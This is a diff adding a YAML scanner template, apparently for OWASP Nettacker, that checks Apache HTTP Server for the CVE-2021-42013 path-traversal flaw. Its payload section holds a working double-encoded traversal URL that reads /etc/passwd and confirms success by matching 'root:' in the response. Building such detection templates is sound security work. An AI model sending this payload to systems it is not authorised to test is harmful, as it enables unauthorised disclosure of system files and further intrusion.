@@ -1,0 +1,53 @@
+info:
+  name: apache_cve_2021_42013_vuln
+  author: OWASP Nettacker Team
+  severity: 9
+  description: A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
+  reference: 
+    - https://github.com/apache/httpd/commit/5c385f2b6c8352e2ca0665e66af022d6e936db6d
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-42013
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - cve2021
+    - cve
+    - apache
+    - path_traversal
+    - lfi
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        verify: false
+        timeout: 3
+        cert: ""
+        stream: false
+        proxies: ""
+        headers:
+          User-Agent: "{user_agent}"
+          Host: '{target}'
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+            content:
+              regex: "root:(\\S+):"
+              reverse: false
